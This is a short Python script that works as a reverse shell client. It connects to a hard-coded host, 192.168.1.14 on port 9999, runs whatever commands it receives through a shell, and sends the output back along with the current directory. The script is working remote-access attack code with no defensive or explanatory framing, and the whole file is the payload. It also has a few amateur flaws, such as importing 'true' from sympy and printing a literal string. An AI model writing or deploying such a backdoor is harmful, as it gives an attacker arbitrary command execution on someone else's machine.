import subprocess
import socket
import sys
import os

from sympy import true

s=socket.socket()
host = "192.168.1.14"  ###My Local ip address
port =9999

s.connect((host,port))
while true:
    data=s.recv(1024)
    if data[:2].decode("utf-8") =="cd":
        os.chdir(data[3:].decode("utf-8"))
    if len(data)>0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE,shell=True) 
        output_byte= cmd.stdout.read() + cmd.stderr.read()
        output_str  = output_byte.decode("utf-8")
        #output_str =  str.  (output_byte,"utf-8")
        Current_WD = os.getcwd() +"> "
        s.send(str.encode(output_str +Current_WD ,"utf-8"))
        print("output_str")







